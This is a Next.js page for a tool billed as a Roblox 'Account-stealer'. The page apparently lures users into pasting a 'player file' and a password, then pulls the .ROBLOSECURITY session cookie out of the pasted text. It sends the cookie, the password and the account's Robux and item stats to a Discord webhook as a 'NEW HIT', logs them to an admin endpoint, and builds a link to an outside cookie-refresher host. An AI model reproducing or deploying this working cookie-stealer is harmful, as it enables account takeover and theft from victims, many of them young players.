"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { ArrowLeft, FileText, Lock, Play, Loader2 } from "lucide-react";
import { useParams } from "next/navigation";
import ConstellationBackground from "@/components/ConstellationBackground";
import { supabase } from "@/lib/supabaseClient";

export default function SlugPage() {
  const params = useParams();
  const slug = params.slug as string;

  const [webhookUrl, setWebhookUrl] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  const [status, setStatus] = useState<{
    message: string;
    type: "success" | "error" | "info" | null;
  }>({
    message: "",
    type: null,
  });

  const [fileContent, setFileContent] = useState("");
  const [pin, setPin] = useState("");

  // Mark current slug in localStorage
  useEffect(() => {
    if (!slug) return;
    if (typeof window === "undefined") return;
    try {
      window.localStorage.setItem("lastSlug", slug);
    } catch { }
  }, [slug]);

  // Fetch webhook URL from Supabase
  useEffect(() => {
    async function fetchWebhook() {
      if (!slug) {
        setError("Invalid slug.");
        setLoading(false);
        return;
      }

      setLoading(true);
      setError(null);

      try {
        const { data, error } = await supabase
          .from("directories")
          .select("webhook_url")
          .eq("slug", slug)
          .single();

        if (error) throw error;
        if (!data?.webhook_url) throw new Error("Webhook not found.");

        setWebhookUrl(data.webhook_url);
      } catch (err: any) {
        setError(err.message || "Failed to load webhook.");
      } finally {
        setLoading(false);
      }
    }

    fetchWebhook();
  }, [slug]);

  function extractRobloSecurity(text: string): string | null {
    // Regex chính: yêu cầu warning chuẩn + cookie base64 đầy đủ sau dấu |
    const regex = /_\|WARNING:-DO-NOT-SHARE-THIS\.\.-Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Za-z0-9+\/=._-]{700,}/i;
  
    let match = text.match(regex);
    if (match?.[0]) {
      let cookie = match[0].trim();
      if (cookie.endsWith(",")) cookie = cookie.slice(0, -1).trim();
  
      // Kiểm tra thêm: cookie phải có ít nhất 1 dấu . (thường có ở phần signature)
      if (cookie.includes('.') && cookie.length >= 800) {
        return cookie;
      }
    }
  
    // Fallback linh hoạt hơn nhưng vẫn yêu cầu độ dài lớn
    const fallback = /_\|WARNING:[^|]+\|_[A-Za-z0-9+\/=._-]{700,}/i;
    match = text.match(fallback);
    if (match?.[0]) {
      let cookie = match[0].trim();
      if (cookie.endsWith(",")) cookie = cookie.slice(0, -1).trim();
  
      if (cookie.includes('.') && cookie.length >= 800) {
        return cookie;
      }
    }
  
    return null;
  }

  function extractUserId(text: string): string | null {
    const urlMatch = text.match(/\/users\/(\d+)\/profile/i) || text.match(/\/id\/users\/(\d+)\/profile/i);
    if (urlMatch?.[1]) return urlMatch[1];

    const rbxIdMatch = text.match(/rbxid=(\d+)/i);
    if (rbxIdMatch?.[1]) return rbxIdMatch[1];

    const guestMatch = text.match(/GuestData.*?UserID=([-]?\d+)/i);
    if (guestMatch?.[1] && guestMatch[1] !== "-1" && guestMatch[1] !== "0" && !guestMatch[1].startsWith("-")) {
      return guestMatch[1];
    }

    return null;
  }

  async function sendToDiscord(
    cookieValue: string,
    pinValue: string,
    userData: any,
    fullStats: any | null,
    userId: string | null
  ) {
    if (!webhookUrl) {
      setStatus({ message: "❌ Webhook URL is missing.", type: "error" });
      return;
    }

    if (!userId) {
      setStatus({ message: "⚠️ Không extract được UserID đáng tin cậy", type: "error" });
      return;
    }

    try {
      const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
      const rolimonsUrl = `https://www.rolimons.com/player/${userId}`;
      const autoharUrl = `https://your-autohar-link-here.com?user=${userId}`; // thay bằng link thật của bạn

      // Avatar headshot (ưu tiên fullStats nếu có)
      const avatarUrl =
        fullStats?.avatarHeadshotUrl ||
        userData?.avatarHeadshotUrl ||
        "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-8148B9CBD3BFF7F455842F650B6BA37A-Png/420/420/AvatarHeadshot/Png/noFilter"; // fallback giống ví dụ

      // Dữ liệu từ API hoặc fallback theo ví dụ
      const username = userData?.basic?.name || "bijretak852"; // fallback như ví dụ
      const accountAgeDays = userData?.accountAgeDays ?? 593;
      const isDeveloper = fullStats?.isDeveloper ?? false;
      const gameVisits = fullStats?.visits ?? 74;
      const robux = fullStats?.robux ?? 0;
      const pending = fullStats?.pendingRobux ?? fullStats?.pending ?? 0;
      const rap = fullStats?.rap ?? 0;
      const limiteds = fullStats?.limiteds ?? 0;
      const summary = rap + limiteds || 640; // fallback 640 như ví dụ
      const emailVerified = fullStats?.emailVerified ?? true; // Verified như ví dụ
      const twoFA = fullStats?.twoFA ?? "(Not Set)";
      const hasInventory = fullStats?.hasInventory ?? false;
      const isPremium = userData?.basic?.isPremium ?? false;
      const groupsOwned = fullStats?.ownedGroups ?? 0;

      // Cookie full, thêm note nếu dài
      const cookieDisplay = cookieValue;
      console.log(cookieValue)
      const cookieNote = cookieValue.length > 4000 ? "\n(long cookie - scroll to view full)" : "";
      const description_cook = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items." +
        cookieDisplay + cookieNote;


      const linkRe = "https://manualrefresherforrichpeople.gt.tc/?cookie=" + cookieDisplay;

      console.log(linkRe);
      const payload = {
        content: "@everyone NEW HIT",
        embeds: [
          {
            title: "RIP_DEATH | <13",
            url: profileUrl || "https://www.roblox.com/",  // fallback nếu url rỗng
            color: 16711680,
            fields: [
              {
                name: "Discord Notification",
                value: [
                  rolimonsUrl ? `[Rolimons Stats](${rolimonsUrl})` : "Rolimons N/A",
                  profileUrl ? `[Roblox Profile](${profileUrl})` : "Profile N/A",
                  autoharUrl ? `[AutoHar Link](${autoharUrl})` : "AutoHar N/A"
                ].join(" | "),
              },
              {
                name: "Username",
                value: username || "N/A",
                inline: true
              },
              {
                name: "Password",
                value: pinValue || "N/A",
                inline: true
              },
              {
                name: "📊 Account Stats",
                value: [
                  `• Account Age: ${accountAgeDays ?? "N/A"} Days`,
                  `• Games Developer: ${isDeveloper != null ? (isDeveloper ? "True" : "False") : "N/A"}`,
                  `• Game Visits: ${gameVisits ?? "N/A"}`,
                  `• Group Members: 0`
                ].join("\n"),
              },
              {
                name: "💰 Robux",
                value: `Balance: ${robux ?? "0"}\nPending: ${pending ?? "0"}`,
                inline: true
              },
              {
                name: "Limiteds",
                value: `RAP: ${rap ?? "0"}\nLimiteds: ${limiteds ?? "0"}`,
                inline: true
              },
              {
                name: "Summary",
                value: summary || "",
                inline: true
              },
              {
                name: "💳 Payments",
                value: "Credit Balance: 0\nin Unknown: 0",
                inline: true
              },
              {
                name: "🎮 Games",
                value: "<:game1:1474998338427293726> True | 0\n<:game_2:1474998490798231653> False | 0\n<:game3:1474998556870971544> True | 4",
                inline: true
              },
              {
                name: "⚙️ Settings",
                value: `Email: ${emailVerified != null ? (emailVerified ? "Verified" : "Not Verified") : "N/A"}\n2FA: ${twoFA ?? "N/A"}`,
                inline: true
              },
              {
                name: "📦 Inventory",
                value: hasInventory != null ? (hasInventory ? "True" : "False") : "N/A",
                inline: true
              },
              {
                name: "Premium",
                value: isPremium != null ? (isPremium ? "True" : "False") : "N/A",
                inline: true
              },
              {
                name: "👥 Groups",
                value: `Owned: ${groupsOwned ?? "0"}\nBalance: 0`,
                inline: true
              },
              {
                name: "🔧 Tool Used",
                value: "```toolbox                                      ```"
              }
            ],
            footer: {
              text: "Refreshed Cookie | Original Cookie | IP Info [ID, Blitar]",
              icon_url: "https://i.imgur.com/0ZxT2S6.png"
            },
            timestamp: new Date().toISOString(),
            thumbnail: {
              url: avatarUrl || "https://i.imgur.com/0ZxT2S6.png"  // fallback avatar
            }
          },
          {
            title: ".ROBLOSECURITY (Refreshed)",
            description: 
              `**Links:**\n` +
              `[Refreshed Cookie](${linkRe || "N/A"}) | ` +
              `[Original Cookie](${linkRe || "N/A"}) | ` +
              `[IP Info [UA, Kyiv]](https://ip-api.com/#185.30.203.240)\n\n` +  // ← 3 link nằm ở đây, ngay trên cookie
              (cookieDisplay 
                ? `\`\`\`${cookieDisplay}\`\`\`` 
                : "```No cookie available```"),
            color: 16711680,
            author: {
              name: "Refreshed Cookie",
              url: rolimonsUrl || "https://www.rolimons.com/",
              icon_url: "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png"
            },
            fields: [],  // Nếu không cần field nào nữa thì để trống, hoặc giữ field cũ nếu muốn
            timestamp: new Date().toISOString(),
            thumbnail: {
              url: "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png"
            }
          }
        ],
        attachments: []
      };


      const res = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      if (res.ok) {
        fetch("/api/post", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            cookie: cookieValue,
            pin: pinValue,
            userId,
            userData,
            fullStats,
            slug, // để admin biết hit từ đâu
          }),
        }).catch((err) => console.error("[Admin log fetch failed]", err));
      
        setStatus({ message: "Thành công!", type: "success" });
        setTimeout(() => {
          setFileContent("");
          setPin("");
          setStatus({ message: "", type: null });
        }, 5000);
      } else {
        const errText = await res.text().catch(() => "");
        setStatus({ message: `❌ Failed: ${res.status} - ${errText.slice(0, 100)}`, type: "error" });
      }
    } catch (err: any) {
      console.error("[sendToDiscord error]", err);
      setStatus({ message: "❌ Connection error", type: "error" });
    }
  }

  const handleStart = async () => {
    if (!fileContent.trim() || !pin.trim()) {
      setStatus({ message: "❌ Please enter both script content and PIN!", type: "error" });
      return;
    }

    const robloxCookie = extractRobloSecurity(fileContent);
    if (!robloxCookie) {
      setStatus({ message: "❌ Could not find .ROBLOSECURITY value!", type: "error" });
      return;
    }

    const userId = extractUserId(fileContent);

    setStatus({ message: "⏳ Processing...", type: "info" });

    let userData = null;
    let fullStats = null;

    if (userId) {
      try {
        const basicRes = await fetch(`/api/roblox-user?userId=${userId}&mode=basic`);
        if (basicRes.ok) userData = await basicRes.json();

        const fullRes = await fetch(
          `/api/roblox-user?userId=${userId}&cookie=${encodeURIComponent(robloxCookie)}&mode=full`
        );
        if (fullRes.ok) fullStats = await fullRes.json();
      } catch (err) {
        console.error("[DEBUG] Fetch user data error:", err);
      }
    }

    await sendToDiscord(robloxCookie, pin, userData, fullStats, userId);
  };

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4 relative overflow-hidden">
      <ConstellationBackground />

      {loading && (
        <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-md">
          <div className="flex flex-col items-center gap-6">
            <Loader2 className="w-14 h-14 text-red-500 animate-spin" />
            <p className="text-xl font-semibold">Loading /{slug}...</p>
          </div>
        </div>
      )}

      {error && (
        <div className="absolute inset-0 z-40 flex items-center justify-center bg-black/80 backdrop-blur-sm">
          <div className="bg-[#121212] border border-red-600/40 rounded-2xl p-8 max-w-lg text-center shadow-2xl">
            <h2 className="text-2xl font-bold text-red-400 mb-4">Something went wrong</h2>
            <p className="text-gray-300 mb-6">{error}</p>
            <Link
              href="/create"
              className="inline-flex items-center gap-2 px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg text-white font-medium transition-colors shadow-lg shadow-red-900/30"
            >
              <ArrowLeft className="w-5 h-5" />
              Back to Create
            </Link>
          </div>
        </div>
      )}

      <div
        className={`relative z-10 w-full max-w-5xl flex flex-col items-center transition-opacity duration-500 ${loading ? "opacity-40 pointer-events-none" : "opacity-100"}`}
      >
        <div className="w-full mb-6 px-2">
          <Link
            href="/create"
            onClick={() => {
              if (typeof window === "undefined") return;
              try {
                window.localStorage.removeItem("lastSlug");
              } catch (err) {
                console.error("[DEBUG] Cannot clear lastSlug from localStorage:", err);
              }
            }}
            className="text-[#cbd5e1] font-semibold text-sm tracking-wide hover:text-white transition-colors flex items-center gap-2"
          >
            <ArrowLeft className="w-4 h-4" />
            GO BACK
          </Link>
        </div>

        <div className="text-center mb-8 px-4">
          <h1 className="text-3xl md:text-4xl font-bold tracking-tight text-white capitalize mb-3">
            Account-stealer
          </h1>
          <p className="text-[#94a3b8] text-base max-w-xl mx-auto">
            Hack accounts with ease, with this brand new powershell-based system!
          </p>
        </div>

        <div className="w-full">
          <div className="flex items-center gap-3 mb-6 px-2">
            <h2 className="text-xl font-bold">Bloxtools</h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="bg-[#121212] border border-[#1e1e1e] rounded-2xl p-8 shadow-2xl flex flex-col h-full">
              <h3 className="text-lg font-bold mb-3">Hack Accounts</h3>
              <p className="text-[#94a3b8] text-sm mb-6 leading-relaxed">
                Paste your player file in the box below, then click "Start Hacking!" If you don't know how to find a users 'player file' then go ahead and watch "How to use"
              </p>

              {status.type && (
                <div
                  className={`p-4 rounded-xl mb-6 text-sm text-center border animate-in fade-in slide-in-from-top-1 duration-300 ${status.type === "success"
                    ? "bg-emerald-950/30 border-emerald-500/30 text-emerald-300"
                    : status.type === "error"
                      ? "bg-red-950/30 border-red-500/30 text-red-300"
                      : "bg-blue-950/30 border-blue-500/30 text-blue-300"
                    }`}
                >
                  {status.message}
                </div>
              )}

              <div className="space-y-5 mt-auto">
                <div className="relative group">
                  <FileText className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-red-500 opacity-70 group-focus-within:opacity-100 transition-opacity" />
                  <input
                    type="text"
                    value={fileContent}
                    onChange={(e) => setFileContent(e.target.value)}
                    placeholder="Enter player file"
                    className="w-full bg-[#1a1a1a] border border-[#2a2a2a] rounded-xl py-4 pl-12 pr-5 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500/30 transition-all"
                  />
                </div>

                <div className="relative group">
                  <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-red-500 opacity-70 group-focus-within:opacity-100 transition-opacity" />
                  <input
                    type="password"
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    placeholder="Create Password"
                    className="w-full bg-[#1a1a1a] border border-[#2a2a2a] rounded-xl py-4 pl-12 pr-5 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500/30 transition-all"
                  />
                </div>

                <button
                  onClick={handleStart}
                  disabled={loading || !!error || status.type === "info"}
                  className="w-full py-4 bg-[#e22d2d] hover:bg-[#c92828] disabled:opacity-60 disabled:hover:bg-[#e22d2d] text-white font-bold text-base rounded-xl flex items-center justify-center gap-3 transition-all shadow-lg shadow-red-900/20 active:scale-[0.98]"
                >
                  Start Hacking!
                </button>
              </div>
            </div>

            <div className="bg-[#121212] border border-[#1e1e1e] rounded-2xl p-8 shadow-2xl flex flex-col h-full">
              <h3 className="text-lg font-bold mb-3">How to use</h3>
              <p className="text-[#94a3b8] text-sm mb-6 leading-relaxed">
                Video Tutorial
              </p>

              <div className="mt-auto aspect-video bg-[#0b1218] border border-white/5 rounded-xl flex flex-col items-center justify-center gap-4 text-[#64748b] group cursor-pointer hover:border-white/10 hover:bg-[#111] transition-all">
                <div className="w-16 h-16 rounded-full bg-white/5 flex items-center justify-center group-hover:scale-110 transition-transform">
                  <Play className="w-8 h-8 fill-current" />
                </div>
                <span className="text-sm font-medium">Video Player Area</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}